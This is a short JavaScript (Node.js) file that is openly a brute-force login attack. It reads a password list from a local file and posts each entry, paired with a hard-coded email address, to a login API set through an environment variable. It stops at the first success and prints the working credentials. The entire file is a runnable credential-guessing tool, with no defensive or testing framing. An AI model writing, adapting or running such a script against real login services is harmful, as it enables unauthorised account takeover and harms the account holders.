import fs from 'fs'
import chalk from 'chalk'
import 'dotenv/config'
import { Worker } from 'worker_threads'
const API_URL = process.env.API_URL
const email = 'sami@gmail.com'


async function bruteForceAttack(password){
    try {
        // fetch data with post Request
        const response = await fetch(API_URL,{
            method:'POST',
            body:JSON.stringify({
                email,
                password
            }),
            headers:{
                'Content-type':'application/json'
            }
        })
        // if response with status OK then return true and log the password
        if(response.ok){
            
            console.log(chalk.green.bold(`Login Successfully Email:${email} , Password:${password} valid`));
            return true
        }
        // if response !== OK then return false with incorrect password
        console.log(chalk.red(`Login Failed, Password ${password} invalid`));
        return false
    } catch (error) {
        console.log(chalk.red(`Login Failed, Password ${password} invalid, Error: ${error.message}`));
        return false
    }
}
//fonction
async function main(){
    try {
        // get array of passwords from file password.txt
        const passwords = fs.readFileSync('password.txt','utf-8').split('\n').map(password=> password.trim())
        for(let password of passwords){
            // if password is valid then stop the Loop
            if(await bruteForceAttack(password)) break
        }
    } catch (error) {
        // failed to read the file
        console.log(chalk.red('Error ',error.message));
    }
}

main()